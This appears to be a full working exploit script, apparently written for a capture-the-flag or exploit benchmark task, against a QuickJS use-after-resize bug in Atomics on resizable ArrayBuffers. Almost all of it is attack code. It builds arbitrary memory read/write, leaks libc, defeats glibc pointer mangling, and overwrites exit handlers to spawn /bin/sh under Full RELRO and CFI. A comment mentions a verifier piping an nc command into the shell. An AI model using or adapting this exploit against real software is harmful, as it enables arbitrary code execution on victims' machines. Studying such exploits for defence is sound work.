// exec-shell-cfi exploit for QuickJS Atomics + Resizable ArrayBuffer bug
//
// Primitive: Use Atomics on a typed array backed by a resizable ArrayBuffer.
// The implementation caches a raw element pointer, then converts the value argument
// (calling user-controlled valueOf), during which we resize the ArrayBuffer.
// The cached pointer becomes stale and is used for the atomic store, giving us a
// controlled write into a reclaimed heap object.
//
// We reclaim the freed backing-store chunk as a Uint8Array JSObject and overwrite
// its internal data pointer -> arbitrary read/write.
//
// For code execution under Full RELRO + CFI, we avoid touching QuickJS function
// pointers and instead patch glibc's exit handler list to call system("/bin/sh")
// at process exit. glibc exit function pointers are mangled with a per-thread guard
// stored in the thread control block (TCB). We locate the TCB mapping just below
// libc and read the guard.
//
// The verifier feeds "nc 127.0.0.1 9999\n" to stdin; /bin/sh reads it and executes it.

const MASK64 = (1n << 64n) - 1n;

function rotl64(x, k) {
  k &= 63n;
  return ((x << k) | (x >> (64n - k))) & MASK64;
}

function u64le(u8, off) {
  let v = 0n;
  for (let i = 0; i < 8; i++) v |= BigInt(u8[off + i]) << (8n * BigInt(i));
  return v;
}
function u32le(u8, off) {
  let v = 0;
  for (let i = 0; i < 4; i++) v |= u8[off + i] << (8 * i);
  return v >>> 0;
}
function u16le(u8, off) {
  return u8[off] | (u8[off + 1] << 8);
}
function write64le(u8, off, val) {
  val &= MASK64;
  for (let i = 0; i < 8; i++) u8[off + i] = Number((val >> (8n * BigInt(i))) & 0xffn);
}

// --- Vulnerability primitive: create a Uint8Array view at an arbitrary address ---
function make_u8_at(addr, backing_ab) {
  const RAB_INIT = 72;
  const RAB_NEW = 0x20000;

  let rab = new ArrayBuffer(RAB_INIT, { maxByteLength: RAB_NEW });
  let atom = new BigUint64Array(rab);
  let victim;

  let malicious = {
    valueOf() {
      rab.resize(RAB_NEW);
      victim = new Uint8Array(backing_ab);
      return addr;
    }
  };

  // index 7 => offset 0x38 => JSObject->u.array.u.ptr
  Atomics.store(atom, 7, malicious);
  return victim;
}

// Leak & free an ArrayBuffer(len), returning its backing store pointer.
// Keep multiple guards alive so the freed chunk isn't merged with top.
let guards = [];
function leak_freed_ab_data_ptr(len, guard_cnt) {
  const RAB_INIT = 56;
  const RAB_NEW = 0x20000;
  let leaked = 0n;

  (function () {
    let rab = new ArrayBuffer(RAB_INIT, { maxByteLength: RAB_NEW });
    let atom = new BigUint64Array(rab);
    let malicious = {
      valueOf() {
        rab.resize(RAB_NEW);
        let victim = new ArrayBuffer(len);
        for (let i = 0; i < guard_cnt; i++) guards.push(new ArrayBuffer(len));
        return 0n;
      }
    };
    // index 2 => offset 0x10 => JSArrayBuffer->data pointer
    leaked = Atomics.add(atom, 2, malicious);
  })();

  return leaked;
}

function leak_libc_ptr(backing_small) {
  for (let guard_cnt = 2; guard_cnt <= 20; guard_cnt += 2) {
    let freed_ptr = leak_freed_ab_data_ptr(0x2000, guard_cnt);
    let u = make_u8_at(freed_ptr, backing_small);
    let leak = u64le(u, 0);
    if ((leak >> 40n) === 0x7fn) return leak;
  }
  throw new Error('failed to leak libc');
}

function find_elf_base_from_ptr(ptr_into_mapping, backing_scan, range) {
  let page = ptr_into_mapping & ~0xfffn;
  let base_guess = page - BigInt(range);
  let scan = make_u8_at(base_guess, backing_scan);
  for (let off = range; off >= 0; off -= 0x1000) {
    let i = off;
    if (scan[i] === 0x7f && scan[i + 1] === 0x45 && scan[i + 2] === 0x4c && scan[i + 3] === 0x46)
      return base_guess + BigInt(off);
  }
  throw new Error('ELF base not found');
}

function get_elf_load_end(elf_base, backing_small) {
  let hdr = make_u8_at(elf_base, backing_small);
  let phoff = u64le(hdr, 0x20);
  let phentsize = u16le(hdr, 0x36);
  let phnum = u16le(hdr, 0x38);
  let max_end = 0n;
  for (let i = 0; i < phnum; i++) {
    let off = Number(phoff + BigInt(i * phentsize));
    let p_type = u32le(hdr, off);
    if (p_type !== 1) continue; // PT_LOAD
    let p_vaddr = u64le(hdr, off + 0x10);
    let p_memsz = u64le(hdr, off + 0x28);
    let end = p_vaddr + p_memsz;
    if (end > max_end) max_end = end;
  }
  return (max_end + 0xfffn) & ~0xfffn;
}

function find_bytes(hay_u8, needle_u8, max_off) {
  outer: for (let i = 0; i <= max_off - needle_u8.length; i++) {
    for (let j = 0; j < needle_u8.length; j++) {
      if (hay_u8[i + j] !== needle_u8[j]) continue outer;
    }
    return i;
  }
  return -1;
}

function find_ptr_guard_near_libc(libc_base, backing_small) {
  // In this environment, the TCB/TLS mapping is immediately below libc:
  //   [tcb] rw-p anon, size 0x2000
  //   [libc] starts at libc_base
  // The pointer guard is at tcb+0x30.
  let tcb_map_base = libc_base - 0x2000n;
  let tcb_view = make_u8_at(tcb_map_base, backing_small);
  for (let off = 0; off <= 0x1f00; off += 0x10) {
    let addr = tcb_map_base + BigInt(off);
    let a0 = u64le(tcb_view, off);
    if (a0 !== addr) continue;
    let a10 = u64le(tcb_view, off + 0x10);
    if (a10 !== addr) continue;
    return u64le(tcb_view, off + 0x30);
  }
  throw new Error('ptr guard not found');
}

function exploit() {
  let backing_small = new ArrayBuffer(0x20000);
  let backing_scan = new ArrayBuffer(0x600000);

  // 1) libc pointer leak from freed chunk metadata
  let libc_leak = leak_libc_ptr(backing_small);

  // 2) libc base by scanning down for ELF header
  let libc_base = find_elf_base_from_ptr(libc_leak, backing_scan, 0x400000);
  // parse PT_LOAD size (used to bound string search)
  let libc_size = get_elf_load_end(libc_base, backing_small);

  // 3) read pointer guard from TCB mapping just below libc
  let ptr_guard = find_ptr_guard_near_libc(libc_base, backing_small);

  // 4) map libc for reading strings/vars
  let libc_view = make_u8_at(libc_base, backing_scan);

  // 5) find "/bin/sh\0" in libc
  let needle = [0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00];
  let max_search = Math.min(libc_view.length, Number(libc_size));
  let binsh_off = find_bytes(libc_view, needle, max_search);
  if (binsh_off < 0) throw new Error('binsh not found');
  let binsh_addr = libc_base + BigInt(binsh_off);

  // 6) patch __exit_funcs[0] to call system("/bin/sh")
  const EXIT_FUNCS_PTR_OFF = 0x1e7680n; // &__exit_funcs
  const SYSTEM_OFF = 0x53110n;

  let system_addr = libc_base + SYSTEM_OFF;
  let mangled_system = rotl64((system_addr ^ ptr_guard) & MASK64, 17n);

  let exit_head = u64le(libc_view, Number(EXIT_FUNCS_PTR_OFF));
  let exit_lst = make_u8_at(exit_head, backing_small);

  // entry0 starts at +0x10
  let e = 0x10;
  write64le(exit_lst, e + 0x00, 4n);             // flavor ef_cxa
  write64le(exit_lst, e + 0x08, mangled_system);  // fn (mangled)
  write64le(exit_lst, e + 0x10, binsh_addr);      // arg

  // Script ends -> process exits -> exit handlers run -> system("/bin/sh")
}

exploit();
